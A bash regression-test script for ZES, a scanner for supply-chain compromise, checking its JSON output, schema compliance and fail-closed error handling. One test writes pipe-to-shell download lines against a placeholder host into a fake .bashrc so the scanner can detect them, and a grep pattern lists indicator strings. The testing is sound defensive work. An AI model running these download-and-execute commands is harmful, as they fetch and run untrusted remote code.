#!/usr/bin/env bash
# ZES v5.2 regression tests
#   Runs zes-scan.sh --json on each fixture and compares the result with tests/expected/*.json.
#   The comparison keys are level / module / campaign / path (relative to the fixture) and, from findings 1.1, kind / subject / locators /
#   related (path relative to the fixture) / evidence.kind. IDs, times, detail wording and evidence.hash (a tree includes mode and
#   depends on the umask of the checkout) are not compared.
#   The (level, module, campaign, path) sets are the safety net of the 0.5.0 message refactor (findings 1.2: code /
#   params / English detail / id v2): no finding may be lost or added. The i18n section checks detail = render(en, params).
#   tests/expected-codes/*.json (written by tests/gen-expected-codes.sh) hold the code / params of every finding; the UI
#   parity test (ui/tests/unit/cli-parity.test.ts) compares the browser engine with them.
#
# Usage: tests/run-tests.sh [--update] [--sync-campaigns]
#   --update          regenerate the expected values from the current output (always review the diff by eye)
#   --sync-campaigns  regenerate rules/campaigns/*.json from rules/ioc.json
set -u
set -o pipefail
export LC_ALL=C

TESTS_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd -P)"
REPO="$(dirname "$TESTS_DIR")"
SCAN="$REPO/zes-scan.sh"
FIX="$TESTS_DIR/fixtures"
EXP="$TESTS_DIR/expected"
IOC="$REPO/rules/ioc.json"
UPDATE=0
SYNC=0
for a in "$@"; do
  case "$a" in
    --update) UPDATE=1 ;;
    --sync-campaigns) SYNC=1 ;;
    *) echo "unknown arg: $a" >&2; exit 64 ;;
  esac
done
command -v jq >/dev/null 2>&1 || { echo "run-tests.sh には jq が必要です" >&2; exit 64; }

TMP="$(mktemp -d "${TMPDIR:-/tmp}/zes-test.XXXXXX")"
trap 'rm -rf "$TMP"' EXIT
PASS=0
FAIL=0
ok()   { PASS=$((PASS + 1)); printf '  ok   %s\n' "$1"; }
ng()   { FAIL=$((FAIL + 1)); printf '  FAIL %s\n' "$1"; [ -n "${2:-}" ] && printf '%s\n' "$2" | sed 's/^/       /'; }

# Environment-independent run (host checks and outbound traffic disabled, time fixed)
run_scan() {
  local root="$1" mode="$2" home="$3"; shift 3
  ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$home" ZES_NOW=1792800000 ZES_SKILLPACT_CACHE='' "$@" \
    "$SCAN" "--$mode" --root "$root" --json 2>"$TMP/stderr.txt"
}

# Normalize findings to comparison keys relative to the fixture (hits under the shared HOME depend on the environment, so they are excluded)
normalize() {
  local root="$1"
  jq -S --arg r "$root/" --arg rr "$root" --arg h "$FIX/_home" '
    def rel: if . == null then null elif . == $rr then "." else ltrimstr($r) end;
    [ .findings[]
      | select(((.path // "") | startswith($h)) | not)
      | { level, module, campaign, path: (.path | rel), evidence: { kind: .evidence.kind } }
        + (if has("kind") then { kind } else {} end)
        + (if has("subject") then { subject } else {} end)
        + (if has("locators") then { locators } else {} end)
        + (if has("related") then { related: [ .related[] | { relation, path: (.path | rel) } ] } else {} end) ]
    | sort_by([.module, .level, (.campaign // ""), (.path // ""), tojson])'
}

# ---------------------------------------------------------------------------
echo "== IoC データベース =="
if jq -e . "$IOC" >/dev/null 2>&1; then ok "rules/ioc.json が valid JSON"; else ng "rules/ioc.json が valid JSON ではない"; fi
n="$(jq '[.packages[] | select((.campaign // "") == "")] | length' "$IOC")"
[ "$n" = "0" ] && ok "全 packages[] に campaign" || ng "campaign の無い packages[] が $n 件"
[ "$(jq -r .incident_bundle "$IOC")" = "ZES-2026-OCT-EMERGENCY-V5.2" ] && ok "incident_bundle = ZES-2026-OCT-EMERGENCY-V5.2" || ng "incident_bundle 不一致"
n="$(grep -c -E '^\s*\{ "campaign": ' "$IOC")"
[ "$n" = "$(jq '.packages | length' "$IOC")" ] && ok "packages[] が 1 エントリ 1 行（grep フォールバック前提）" || ng "packages[] の 1 行整形が崩れています"

# Generation of rules/campaigns/*.json (ioc.json is the source of truth)
gen_campaign() {
  local f="$1" camps="$2" secs="$3"
  jq --argjson c "$camps" --argjson s "$secs" --arg f "$f" '
    . as $r |
    { campaign: $f,
      incident_bundle: $r.incident_bundle,
      source: "rules/ioc.json（本ファイルは複製。正はioc.json）",
      campaigns: $c,
      packages: [ $r.packages[] | select(.campaign as $x | $c | index($x)) ],
      iocs: ( reduce $s[] as $p ({}; . + { ($p|join(".")): ($r | getpath($p)) }) ),
      malicious_files: [ $r.malicious_files_campaign | to_entries[] | select(.value as $x | $c | index($x)) | .key ] }' "$IOC"
}
CAMPAIGN_DEFS=(
  'litellm-oct2026|["litellm-oct2026"]|[]'
  'teampcp-mini-shai-hulud|["teampcp-mini-shai-hulud"]|[["worm_iocs","teampcp"]]'
  'chaindrop-keyv|["chaindrop-keyv"]|[["worm_iocs","chaindrop"]]'
  'pypi-oct2026|["pypi-oct2026"]|[]'
  'solana-typosquat|["solana-typosquat"]|[]'
  'post-shaihulud|["post-shaihulud","shai-hulud-chaindrop","sckit-memos"]|[["worm_iocs","post_shaihulud"],["worm_iocs","miasma"],["worm_iocs","sckit"]]'
  'mcp-poisoning|["mcp-poisoning"]|[["mcp_poisoning"]]'
  'hf-supply-chain|["hf-supply-chain","hf-dataset-poisoning","hf-lerobot-rce"]|[["model_supply_chain"]]'
  'ebpf-rootkit|["ebpf-rootkit"]|[["worm_iocs","quasar_linux"],["worm_iocs","linkpro"],["worm_iocs","voidlink"],["persistence","ebpf_rootkit"]]'
  'ghostaction-oct2026|["ghostaction-oct2026","megalodon-ci"]|[["github_actions"]]'
  'skillpact|["skillpact-undeclared","skillpact-invalid","skillpact-divergence","skillpact-account-compromise"]|[["skillpact"]]'
)
for def in "${CAMPAIGN_DEFS[@]}"; do
  IFS='|' read -r f camps secs <<<"$def"
  gen_campaign "$f" "$camps" "$secs" >"$TMP/$f.json"
  if [ "$SYNC" -eq 1 ]; then cp "$TMP/$f.json" "$REPO/rules/campaigns/$f.json"; fi
  if cmp -s "$TMP/$f.json" "$REPO/rules/campaigns/$f.json"; then ok "rules/campaigns/$f.json が ioc.json と同期"
  else ng "rules/campaigns/$f.json が ioc.json と非同期（--sync-campaigns で再生成）"; fi
done

# ---------------------------------------------------------------------------
echo "== フィクスチャ照合 =="
REQUIRED_TOP='["errors","findings","incident_bundle","scan_finished_at","scan_mode","scan_roots","scan_started_at","schema_version","status"]'
FINDING_KEYS='["campaign","code","detail","evidence","evidence_hash","id","level","module","params","path"]'
SP_KEYS='["author","contract_path","contract_version","declared_effects","diff_anomaly","divergence","l2_tested","level","observed_effects","policy_decision","signed"]'
for e in "$EXP"/*.json; do
  name="$(basename "$e" .json)"
  case "$name" in _*) continue ;; esac
  mode="$(jq -r '.mode' "$e")"
  home="$(jq -r '.home // "_home"' "$e")"
  root="$FIX/$name"
  [ "$home" = "self" ] && home="$root" || home="$FIX/$home"
  if ! run_scan "$root" "$mode" "$home" >"$TMP/out.json"; then ng "$name: zes-scan.sh が異常終了" "$(tail -n 5 "$TMP/stderr.txt")"; continue; fi
  if ! jq -e . "$TMP/out.json" >/dev/null 2>&1; then ng "$name: 出力が valid JSON ではない"; continue; fi
  cp "$TMP/out.json" "$TMP/fx-$name.json"
  # Schema (strict: no unknown fields)
  bad="$(jq -r --arg root "$root" --argjson t "$REQUIRED_TOP" --argjson fk "$FINDING_KEYS" --argjson sk "$SP_KEYS" '
    [ (if (keys != $t) then "top-level keys: \(keys)" else empty end),
      (.findings[] | (keys - ["skillpact","kind","subject","locators","related"]) as $k | select($k != $fk) | "finding keys: \($k)"),
      (if .schema_version != "1.2" then "schema_version: \(.schema_version)" else empty end),
      (if .scan_roots != [$root] then "scan_roots: \(.scan_roots)" else empty end),
      (.findings[] | select((.evidence.kind == "file" or .evidence.kind == "large_file") and .evidence.hash != .evidence_hash) | "evidence.hash != evidence_hash: \(.path)"),
      (.findings[] | select(has("skillpact")) | .skillpact | keys | select(. != $sk) | "skillpact keys: \(.)"),
      (.findings[] | select((.id | test("^sha256:[0-9a-f]{64}$")) | not) | "bad id: \(.id)"),
      ([.findings[].id] | group_by(.) | map(select(length > 1) | "duplicate id: \(.[0]) x\(length)") | .[]),
      (.findings[] | select(.level as $l | ["CRITICAL","HIGH","MEDIUM","LOW","INFO"] | index($l) | not) | "bad level: \(.level)"),
      (.findings[] | select(.path != null and (.path | startswith("/") | not)) | "relative path: \(.path)"),
      (if (.status as $s | ["ok","partial","error"] | index($s)) then empty else "bad status" end) ] | .[]' "$TMP/out.json")"
  if [ -n "$bad" ]; then ng "$name: 出力スキーマ違反" "$bad"; continue; fi
  normalize "$root" <"$TMP/out.json" >"$TMP/actual.json"
  if [ "$UPDATE" -eq 1 ]; then
    hraw="$(jq -r '.home // "_home"' "$e")"
    jq -S -n --arg m "$mode" --arg h "$hraw" --slurpfile f "$TMP/actual.json" '{mode:$m, home:$h, findings:$f[0]}' >"$TMP/new-expected.json" && mv "$TMP/new-expected.json" "$e"
  fi
  jq -S '.findings' "$e" >"$TMP/expected.json"
  if diff -u "$TMP/expected.json" "$TMP/actual.json" >"$TMP/diff.txt"; then ok "$name ($mode): $(jq length "$TMP/actual.json") 件一致"
  else ng "$name ($mode): 期待値と不一致" "$(head -n 40 "$TMP/diff.txt")"; fi
  # Second layer: code / params of every finding (tests/expected-codes, compared with the UI engine by cli-parity.test.ts)
  jq -S --arg r "$root/" --arg rr "$root" --arg h "$FIX/_home" -f "$TESTS_DIR/expected-codes.jq" "$TMP/out.json" >"$TMP/actual-codes.json"
  if [ ! -f "$TESTS_DIR/expected-codes/$name.json" ]; then ng "$name: tests/expected-codes/$name.json がありません（tests/gen-expected-codes.sh $name）"
  elif diff -u "$TESTS_DIR/expected-codes/$name.json" "$TMP/actual-codes.json" >"$TMP/diff-codes.txt"; then ok "$name: code / params が tests/expected-codes と一致"
  else ng "$name: code / params が tests/expected-codes と不一致（意図した変更なら tests/gen-expected-codes.sh $name）" "$(head -n 40 "$TMP/diff-codes.txt")"; fi
done

# ---------------------------------------------------------------------------
echo "== 横断チェック =="
# Validation against schemas/findings.schema.json (when python3 + jsonschema are available; otherwise an explicit SKIP)
if python3 -I -c 'import jsonschema' 2>/dev/null; then
  for m in full skillpact; do run_scan "$FIX" "$m" "$FIX/_home" >"$TMP/schema-$m.json"; done
  run_scan "$FIX/chaindrop" quick "$FIX/_home" env ZES_FORCE_NO_JQ=1 >"$TMP/schema-nojq.json"
  if out="$(python3 -I - "$REPO/schemas/findings.schema.json" "$TMP"/schema-*.json <<'PY' 2>&1
import json, sys
from jsonschema import Draft202012Validator
schema = json.load(open(sys.argv[1], encoding="utf-8"))
Draft202012Validator.check_schema(schema)
v = Draft202012Validator(schema)
bad = 0
for f in sys.argv[2:]:
    for e in v.iter_errors(json.load(open(f, encoding="utf-8"))):
        bad += 1
        print(f"{f.rsplit('/', 1)[-1]}: {'/'.join(map(str, e.absolute_path))}: {e.message}"[:300])
sys.exit(1 if bad else 0)
PY
)"; then ok "出力が schemas/findings.schema.json に適合（full / skillpact / jq なし）"
  else ng "出力が schemas/findings.schema.json に不適合" "$(printf '%s' "$out" | head -n 20)"; fi
else
  printf '  SKIP schemas/findings.schema.json の検証（python3 の jsonschema が未導入）\n'
fi

# Deterministic IDs (identical on rescan). To catch a race that only changes them under heavy load (upstream SIGPIPE from grep -q at the end of a pipe with pipefail),
#   the same fixture is scanned 8 times in parallel each, checking that the multisets of id, evidence and locators are all identical
det_ok=1; det_msg=""
for nm in skillpact-divergence browser-ext mcp chaindrop; do
  dm="$(jq -r '.mode' "$EXP/$nm.json")"
  for i in 1 2 3 4 5 6 7 8; do
    ( run_scan "$FIX/$nm" "$dm" "$FIX/_home" 2>/dev/null | jq -c '[.findings[] | [.id, .evidence, (.locators // null), (.related // null)]] | sort' >"$TMP/det-$nm-$i" ) &
  done
  wait
  for i in 2 3 4 5 6 7 8; do
    cmp -s "$TMP/det-$nm-1" "$TMP/det-$nm-$i" || { det_ok=0; det_msg="$det_msg $nm#$i"; }
  done
  [ "$(jq length "$TMP/det-$nm-1" 2>/dev/null || echo 0)" -gt 0 ] || { det_ok=0; det_msg="$det_msg $nm:empty"; }
done
[ "$det_ok" -eq 1 ] && ok "findings[].id・evidence・locators が決定的（4 フィクスチャ × 並列 8 回で同一）" || ng "findings[].id 等が再スキャンで変化:$det_msg"
# Do not use grep -q at the end of a pipe (if the upstream fails with SIGPIPE, pipefail makes it false although it matched; use grep_q)
n="$(grep -c -E '\|[[:space:]]*grep[[:space:]]+(-[A-Za-z]*q|[^|]*[[:space:]]-[A-Za-z]*q)([[:space:]]|$)' "$SCAN")"
[ "$n" = "0" ] && ok "zes-scan.sh のパイプ末尾に grep -q が無い（grep_q で入力を読み切る）" || ng "zes-scan.sh のパイプ末尾に grep -q が $n 箇所"

# Test vector of ger-tree-v1 (GER docs/design/design.md §10.8). Loads only zes_tree_hash from zes-scan.sh to compute it
mkdir -p "$TMP/tv/t/b" && printf 'hello\n' >"$TMP/tv/t/a" && : >"$TMP/tv/t/b/c" && ln -s a "$TMP/tv/t/l"
chmod 644 "$TMP/tv/t/a"; chmod 600 "$TMP/tv/t/b/c"; chmod 700 "$TMP/tv/t/b"; chmod 755 "$TMP/tv/t"
th="$(OS_NAME="$(uname -s)" TMP_DIR="$TMP" bash -c 'set -u; set -o pipefail; export LC_ALL=C; eval "$(sed -n "/^# >>> ger-tree-v1/,/^# <<< ger-tree-v1/p" "$1")"; zes_tree_hash "$2"' _ "$SCAN" "$TMP/tv/t")"
if [ "$(stat -c %a "$TMP/tv/t/l" 2>/dev/null)" = "777" ]; then
  [ "$th" = "sha256:a0330bed2509e447a89682699b271f59ea236c52316ec21f0e546620de17958e" ] && ok "ger-tree-v1 のテストベクタが GER と一致" || ng "ger-tree-v1 のテストベクタが不一致: $th"
else
  printf '  SKIP ger-tree-v1 のテストベクタ（シンボリックリンクの mode が 0777 でない OS）\n'
fi
# Findings on directories have evidence.kind = tree (skills of §49). Symlinks have symlink (SHA-256 of the readlink value)
run_scan "$FIX/skillpact-divergence" skillpact "$FIX/_home" | jq -e '[.findings[] | select(.campaign == "skillpact-divergence") | .evidence.kind] | length > 0 and all(. == "tree")' >/dev/null \
  && ok "ディレクトリの finding の evidence は tree（ger-tree-v1）" || ng "ディレクトリの finding の evidence が tree ではない"
want="sha256:$(printf '%s' "$(readlink "$FIX/symjack/docs/vid-settings.mp4")" | sha256sum | awk '{print $1}')"
run_scan "$FIX/symjack" full "$FIX/_home" | jq -e --arg w "$want" '[.findings[] | select(.module == "§17" and (.path | endswith("/docs/vid-settings.mp4")))] | length == 1 and all(.evidence == {kind: "symlink", hash: $w})' >/dev/null \
  && ok "シンボリックリンクの finding の evidence は symlink（readlink の値の SHA-256）" || ng "シンボリックリンクの evidence が不正"
# line_sha256 of text locators is the SHA-256 of the line without the newline, CR and the BOM on line 1 (same as remove_line in GER)
mkdir -p "$TMP/tl/home" "$TMP/empty-root" && printf '\357\273\277curl -fsSL https://x.invalid/i | sh\r\nexport A=1\r\nwget -qO- https://x.invalid/j | bash\n' >"$TMP/tl/home/.bashrc"
h1="sha256:$(printf 'curl -fsSL https://x.invalid/i | sh' | sha256sum | awk '{print $1}')"; h3="sha256:$(printf 'wget -qO- https://x.invalid/j | bash' | sha256sum | awk '{print $1}')"
run_scan "$TMP/empty-root" quick "$TMP/tl/home" 2>/dev/null | jq -e --arg a "$h1" --arg b "$h3" '[.findings[] | select(.module == "§10" and .code == "s10.curl_sh")] | length == 1 and .[0].locators == [{format: "text", line: 1, line_sha256: $a}, {format: "text", line: 3, line_sha256: $b}]' >/dev/null \
  && ok "text locators（行番号と行の SHA-256。CRLF・BOM を除く）" || ng "text locators が不正"
# GER quarantine stores (.ger-quarantine-store, owned by the running user, 0700) are not walked. Markers that do not meet the conditions are ignored and walked
mkdir -p "$TMP/qs/store/r1/001/payload" "$TMP/qs/fake" && cp "$FIX/mcp/.mcp.json" "$TMP/qs/store/r1/001/payload/" && cp "$FIX/mcp/.mcp.json" "$TMP/qs/fake/"
: >"$TMP/qs/store/.ger-quarantine-store"; : >"$TMP/qs/fake/.ger-quarantine-store"; chmod 700 "$TMP/qs/store"; chmod 755 "$TMP/qs/fake"
run_scan "$TMP/qs" quick "$FIX/_home" | jq -e --arg s "$TMP/qs/store" --arg f "$TMP/qs/fake" '
  ([.findings[] | select(.path | startswith($s + "/"))] | length == 0)
  and ([.findings[] | select(.path == $f + "/.mcp.json")] | length >= 1)
  and ([.errors[] | select(.reason == "quarantine_store_skipped:" + $s)] | length == 1)
  and ([.errors[] | select(.reason == "quarantine_marker_untrusted:" + $f)] | length == 1)' >/dev/null \
  && ok "GER の隔離ストアを走査しない（偽のマーカーは無視して errors[] に記録）" || ng "隔離ストアの扱いが不正"

# findings.skillpact field (attached to every finding of §49)
n="$(run_scan "$FIX" skillpact "$FIX/_home" | jq '[.findings[] | select(.module == "§49" and (has("skillpact") | not))] | length')"
[ "$n" = "0" ] && ok "§49 の全 finding に skillpact フィールド" || ng "skillpact フィールドの無い §49 finding が $n 件"

# Signatures do not change severity (ZES does not verify signatures): an undeclared network in a signed contract is still HIGH
lv="$(run_scan "$FIX/skillpact-signed-divergence" skillpact "$FIX/_home" | jq -r '[.findings[] | select(.skillpact.signed == true and (.skillpact.divergence | index("network"))) | select(.campaign == "skillpact-divergence") | .level] | unique | join(",")')"
[ "$lv" = "HIGH" ] && ok "署名付き契約でも未宣言 network は HIGH（署名を信頼判定に使わない）" || ng "署名付き契約の乖離の重大度が HIGH ではない: $lv"
# A real SkillPact-format contract (tests/fixtures/skillpact-clean) reports nothing in §49 (no false positives)
n="$(run_scan "$FIX/skillpact-clean" skillpact "$FIX/_home" | jq '.findings | length')"
[ "$n" = "0" ] && ok "有効な SkillPact 0.8 契約で §49 の検出 0 件" || ng "有効な SkillPact 契約で $n 件を検出（誤検知）"
# §49 never emits CRITICAL (contracts are self-declared; divergence is at most HIGH)
n="$(run_scan "$FIX" skillpact "$FIX/_home" | jq '[.findings[] | select(.module == "§49" and .level == "CRITICAL")] | length')"
[ "$n" = "0" ] && ok "§49 は CRITICAL を出さない" || ng "§49 が CRITICAL を $n 件出力"

# No content reading: secret-like strings in the fixtures are not in the output
out="$(run_scan "$FIX" full "$FIX/_home")"
if printf '%s' "$out" | grep -q -E 'cHJpbnQoMSk=|zes-canary|libprocesshider|collector\.example\.invalid|updates\.example\.invalid'; then ng "出力にファイル内容が含まれています"
else ok "出力にファイル内容を含まない（パスとメタ情報のみ）"; fi
printf '%s' "$out" | jq -e '.scan_mode == "full"' >/dev/null && ok "--full が完走し valid JSON" || ng "--full の出力が不正"
for m in quick standard worm skillpact; do
  run_scan "$FIX" "$m" "$FIX/_home" | jq -e --arg m "$m" '.scan_mode == $m and (.status | IN("ok","partial"))' >/dev/null \
    && ok "--$m が完走し valid JSON" || ng "--$m の出力が不正"
done

# Without jq (grep fallback) the main IoCs are still detected, and §49 is treated as undetermined (errors[])
nojq="$(run_scan "$FIX/chaindrop" quick "$FIX/_home" env ZES_FORCE_NO_JQ=1)"
printf '%s' "$nojq" | jq -e '[.findings[] | select(.level=="CRITICAL" and .module=="§15")] | length >= 3' >/dev/null \
  && ok "jq なしフォールバックで ChainDrop/keyv/solana を検出" || ng "jq なしフォールバックの検出が不足"
run_scan "$FIX/skillpact-divergence" skillpact "$FIX/_home" env ZES_FORCE_NO_JQ=1 | jq -e '.status == "partial" and ([.errors[] | select(.module=="§49" and .reason=="jq_unavailable")] | length == 1)' >/dev/null \
  && ok "jq なしでは §49 を errors[] に記録（0件扱いしない / fail-closed）" || ng "jq なしの §49 が fail-closed になっていない"

# The ZES directory itself contains IoCs, so it is excluded when scanned from an outer root
mkdir -p "$TMP/outer"
cp -R "$REPO/zes-scan.sh" "$REPO/rules" "$REPO/i18n" "$REPO/tests" "$TMP/outer/" 2>/dev/null
mkdir -p "$TMP/outer-root" && mv "$TMP/outer" "$TMP/outer-root/zes"
n="$(ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$FIX/_home" "$TMP/outer-root/zes/zes-scan.sh" --quick --root "$TMP/outer-root" --json 2>/dev/null | jq --arg r "$TMP/outer-root/zes/" '[.findings[] | select((.path // "") | startswith($r))] | length' 2>/dev/null)"
[ "${n:-x}" = "0" ] && ok "ZES 自身（rules/tests/docs）を外側から走査した場合は除外" || ng "ZES 自身のファイルを検出しています（$n 件）"

# Unreadable MCP configs (still invalid when reread as JSONC) are recorded in errors[] (fail-closed)
mkdir -p "$TMP/badmcp" && printf '{ "mcpServers": { "x": { "command": "bash" ' >"$TMP/badmcp/.mcp.json"
run_scan "$TMP/badmcp" quick "$FIX/_home" | jq -e '[.errors[] | select(.module == "§17" and (.reason | startswith("mcp_config_parse_failed:")))] | length == 1' >/dev/null \
  && ok "不正な MCP 設定を errors[] に記録（0件扱いしない）" || ng "不正な MCP 設定が errors[] に記録されていません"
# Unparsable Codex TOML (unclosed header, no command, command is an array) is recorded in errors[] (fail-closed)
n="$(run_scan "$FIX/codex-toml-broken" quick "$FIX/_home" | jq '[.errors[] | select(.module == "§17" and (.reason | startswith("codex_toml_unparsed:")))] | length')"
[ "$n" = "3" ] && ok "解釈できない Codex TOML を errors[] に記録（3 件）" || ng "解釈できない Codex TOML の errors[] が 3 件ではありません（${n:-?} 件）"
# When a jq filter of intel fails, it is recorded in errors[] (host IoCs etc. are not silently disabled)
jq '.intel.host = [{"campaign": "zes-test", "paths": 5}]' "$IOC" >"$TMP/ioc-broken-intel.json"
mkdir -p "$TMP/empty-root"
ZES_IOC="$TMP/ioc-broken-intel.json" run_scan "$TMP/empty-root" standard "$FIX/_home" | jq -e '[.errors[] | select(.module == "§30" and (.reason | startswith("intel_jq_failed:")))] | length >= 1' >/dev/null \
  && ok "intel の jq 失敗を errors[] に記録（fail-closed）" || ng "intel の jq 失敗が errors[] に記録されていません"

# Even with host checks enabled, findings[].path is an absolute path or null (no pseudo paths such as "auditd" / "crontab:user")
mkdir -p "$TMP/host-root" "$TMP/host-home"
bad="$(ZES_HOST_CHECKS=1 ZES_OFFLINE=1 ZES_HOME="$TMP/host-home" "$SCAN" --full --root "$TMP/host-root" --json 2>/dev/null \
  | jq -r '[.findings[] | select(.path != null and (.path | startswith("/") | not)) | .path] | join(",")' 2>/dev/null)"
[ -z "$bad" ] && ok "ホスト検査の findings[].path が絶対パスか null" || ng "ホスト検査で絶対パスでない path: $bad"

# Absolute paths in intel.host are matched only against real host paths (only when ZES_HOST_CHECKS=1; same-named suffixes inside the scan root are not looked at)
mkdir -p "$TMP/hostioc" "$TMP/hostioc-root$TMP/hostioc" && : >"$TMP/hostioc/marker" && : >"$TMP/hostioc-root$TMP/hostioc/marker"
jq --arg p "$TMP/hostioc/marker" '.intel.host = [{"campaign": "zes-test-host", "severity": "HIGH", "paths": [$p]}]' "$IOC" >"$TMP/ioc-hostpath.json"
on="$(ZES_IOC="$TMP/ioc-hostpath.json" ZES_HOST_CHECKS=1 ZES_OFFLINE=1 ZES_HOME="$TMP/host-home" "$SCAN" --standard --root "$TMP/hostioc-root" --json 2>/dev/null | jq -r '[.findings[] | select(.campaign == "zes-test-host") | .path] | join(",")')"
off="$(ZES_IOC="$TMP/ioc-hostpath.json" run_scan "$TMP/hostioc-root" standard "$TMP/host-home" | jq -r '[.findings[] | select(.campaign == "zes-test-host") | .path] | join(",")')"
[ "$on" = "$TMP/hostioc/marker" ] && [ -z "$off" ] && ok "intel.host の絶対パスはホスト検査時の実パスのみ照合" || ng "intel.host の絶対パスの照合先が不正（on=$on off=$off）"

# include.path (FIFO) in the inspected .git/config does not stall the scan / if git stalls, it is cut off by timeout and recorded in errors[]
if command -v git >/dev/null 2>&1 && command -v mkfifo >/dev/null 2>&1 && command -v timeout >/dev/null 2>&1; then
  for k in inc pr; do
    ( export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
      mkdir -p "$TMP/git-$k" && cd "$TMP/git-$k" && git init -q . && echo inert >README && git add README \
        && git -c user.name=a -c user.email=a@example.invalid commit -q -m init ) >/dev/null 2>&1
  done
  mkfifo "$TMP/git-inc/.git/hang.fifo" && printf '[include]\n\tpath = hang.fifo\n[includeIf "gitdir:/"]\n\tpath = hang.fifo\n' >>"$TMP/git-inc/.git/config"
  out="$(ZES_GIT_TIMEOUT=10 timeout 120 env ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$FIX/_home" "$SCAN" --full --root "$TMP/git-inc" --json 2>/dev/null)"
  # The include target (FIFO) is not read; git_include_unresolved is recorded, and no git failure (git_timeout etc.) occurs
  printf '%s' "$out" | jq -e '([.findings[] | select(.module == "§46" and .code == "s46.unsigned" and .params.total == "1")] | length == 1) and ([.errors[] | select(.reason | test("^git_")) | select(.reason | test("^git_include_unresolved:") | not)] | length == 0) and ([.errors[] | select(.reason | test("^git_include_unresolved:"))] | length >= 1)' >/dev/null 2>&1 \
    && ok "検査対象 .git/config の include.path（FIFO）を読まずに §46 を完走（errors[] に git_include_unresolved）" || ng "include.path（FIFO）で走査が停止または §46 が失敗"
  mkfifo "$TMP/git-pr/.git/packed-refs"
  out="$(ZES_GIT_TIMEOUT=2 timeout 120 env ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$FIX/_home" "$SCAN" --full --root "$TMP/git-pr" --json 2>/dev/null)"
  printf '%s' "$out" | jq -e '[.errors[] | select(.module == "§46" and .reason == "git_timeout")] | length >= 1' >/dev/null 2>&1 \
    && ok "git が停止した場合は timeout で打ち切り errors[] に git_timeout を記録" || ng "git の停止が errors[] に記録されていません"
else
  printf '  SKIP git/mkfifo/timeout が無いため .git の FIFO チェックを省略\n'
fi

# Control characters and invalid UTF-8 in file names: the JSON is valid UTF-8, the id can be recomputed from the output values, no ESC in the human-readable log
mkdir -p "$TMP/names"
for nm in $'esc\033[31m' $'bad\377\376' $'c1\302\233' 'back\x41slash' $'tab\tname'; do
  mkdir -p "$TMP/names/$nm" && printf '// ZES test fixture\nconst p = ".claude/";\n' >"$TMP/names/$nm/setup.mjs"
done
run_scan "$TMP/names" quick "$FIX/_home" >"$TMP/names.json"; cp "$TMP/stderr.txt" "$TMP/names.log"
if python3 -I -c 'pass' 2>/dev/null; then
  if out="$(python3 -I - "$TMP/names.json" <<'PY' 2>&1
import hashlib, json, sys
raw = open(sys.argv[1], "rb").read()
d = json.loads(raw.decode("utf-8"))  # strict UTF-8
esc = lambda s: s.replace("\\", "\\\\").replace("|", "\\|").replace("\x1f", "\\u001f")
# Since 0.5.2 an invalid byte is \xHH in the id preimage, while findings.json shows it as the text "\xHH" (escaped to
#   \\xHH): for the paths in non_utf8_path (no literal backslash here) the \xHH of the path are bytes
nonutf8 = {e["reason"][len("non_utf8_path:"):] for e in d["errors"] if e["reason"].startswith("non_utf8_path:")}
def v2(f):
    canon = "\x1f".join(k + "=" + esc(f["params"][k]) for k in sorted(f["params"], key=lambda k: k.encode()))
    p = esc(f["path"] or "")
    if f["path"] in nonutf8: p = p.replace("\\\\x", "\\x")
    return "sha256:" + hashlib.sha256("|".join(["zes-id-v2"] + [esc(x) for x in (f["module"], f["campaign"] or "")] + [p, esc(f["code"])] + [canon]).encode()).hexdigest()
bad = [f["path"] for f in d["findings"] if f["id"] != v2(f)]
n = len([f for f in d["findings"] if f["module"] == "§17"])
nu = len([e for e in d["errors"] if e["module"] == "core" and e["reason"].startswith("non_utf8_path:") and "\\xff\\xfe" in e["reason"]])
print(f"mismatch={bad} s17={n} non_utf8={nu}")
sys.exit(0 if not bad and n == 5 and nu == 1 else 1)
PY
)"; then ok "制御文字・不正 UTF-8 のパス: valid UTF-8 JSON・id v2 再計算一致・errors[] に non_utf8_path"
  else ng "制御文字・不正 UTF-8 のパスの出力が不正" "$out"; fi
else
  printf '  SKIP 不正 UTF-8 パスの JSON 検証（python3 が無い）\n'
fi
# Normal-form collision: a name made of the 4 characters "\xfe" and a name with the invalid byte 0xFE get the same path in
# findings.json. Since 0.5.2 the id preimage is injective (ENC_ID), so both findings are kept with distinct ids and no
# duplicate_finding_id (before, the second one was dropped)
mkdir -p "$TMP/collide/a"$'\xfe' "$TMP/collide/a\xfe"
for d in "$TMP/collide/a"$'\xfe' "$TMP/collide/a\xfe"; do cp "$FIX/mcp/.mcp.json" "$d/"; done
run_scan "$TMP/collide" quick "$FIX/_home" | jq -e '([.findings[].id] | length) == ([.findings[].id] | unique | length)
  and ([.findings[] | select(.module == "§17" and (.path | endswith("/.mcp.json")))] | length) == ([.findings[] | select(.module == "§17")] | length)
  and ([.findings[] | select(.module == "§17") | .path] | unique | length) == 1 and ([.findings[] | select(.module == "§17")] | length) >= 2
  and ([.errors[] | select(.reason | startswith("duplicate_finding_id:"))] | length == 0)' >/dev/null \
  && ok "正規形が衝突するパス（不正バイトと文字列 \\xfe）でも 2 件とも別 id で残り、duplicate_finding_id なし" \
  || ng "正規形が衝突するパスの finding が落ちた、または id が重複"
if grep -q $'\033' "$TMP/names.log"; then ng "人間向けログに ESC（端末エスケープ）がそのまま出力されています"
else ok "人間向けログの制御文字を \\xHH で表示（端末エスケープ注入なし）"; fi
# ZES_HOME is normalized to its real path (relative path, trailing slash, nonexistent directory)
bad="$(cd "$FIX" && ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="_home/" "$SCAN" --quick --root "$TMP/empty-root" --json 2>/dev/null \
  | jq -r --arg h "$FIX/_home/" '[.findings[] | select(.path != null) | select((.path | startswith($h) | not) or (.path | contains("//"))) | .path] | join(",")')"
n="$(cd "$FIX" && ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="_home/" "$SCAN" --quick --root "$TMP/empty-root" --json 2>/dev/null | jq '.findings | length')"
[ -z "$bad" ] && [ "${n:-0}" -gt 0 ] && ok "相対・末尾スラッシュ付き ZES_HOME を実パスに正規化" || ng "ZES_HOME が正規化されていません: ${bad:-findings=$n}"
